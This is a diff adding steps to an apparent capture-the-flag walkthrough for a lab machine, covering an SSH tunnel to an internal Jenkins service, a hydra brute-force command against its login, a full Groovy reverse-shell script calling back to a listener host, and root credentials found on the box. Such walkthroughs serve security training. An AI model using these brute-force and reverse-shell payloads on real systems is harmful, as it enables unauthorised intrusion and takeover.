@@ -151,13 +151,32 @@ Internal Jenkins service is running on 172.17.0.2:8080
 ```
 5. ``uname -a`` gives us kernal information: ``Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux``
 6. lets wget and ./linpeas.sh on the machine to see what we missed...
-
 ```shell
 Exploit: Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method)
       URL: https://www.exploit-db.com/exploits/47167
      Path: /usr/share/exploitdb/exploits/linux/local/47167.sh
 File Type: POSIX shell script, ASCII text executable
 ```
+7. Can't seem to get that exploit to work - so going back to the "Internal Jenkins service is running on 172.17.0.2:8080". Some googling says that this is an internal Docker Service. INTERNAL! The name of the client this must be our way to root?
+8. Because this is an internal IP we need to create an SSH tunnel a to access it from our remote machine. 
+- ``ssh aubreanna@10.10.238.97 -N -f -L 2222:172.17.0.2:8080`` -N create non interactive -f request ssh to go to the background -L for local port forward
+9. With the SSH tunnel setup we can access the Internal Jenkins at http://localhost:2222
+10. build hydra to brute force?
+11. ``hydra -t 16 -l admin -P /usr/share/seclists/Passwords/rockyou.txt localhost -s 2222 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"  ``
+12. admin:spongebob
+13. traveling to the script console we can abuse this to run commands on the internal jenkins system and get a reverse shell. 
+```shell
+String host="10.2.127.225";
+
+int port=6666;
+
+String cmd=”bash”;
+
+Process p=new 
+ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+14. ``nc -nvlp 6666`` on our kali machine and run the script in the console to get out shell.
+15. checking around this machine and checking out /opt/ we can see a note for aubreanna with root ssh credentials. root:tr0ub13guM!@#123
 
 ##### [](#header-5)Answer the questions below
 
@@ -166,6 +185,8 @@ File Type: POSIX shell script, ASCII text executable
 ![](/assets/internal04.png)
 
 **Root.txt Flag**
+
+![](/assets/internal05.png)
 
 * * *
 
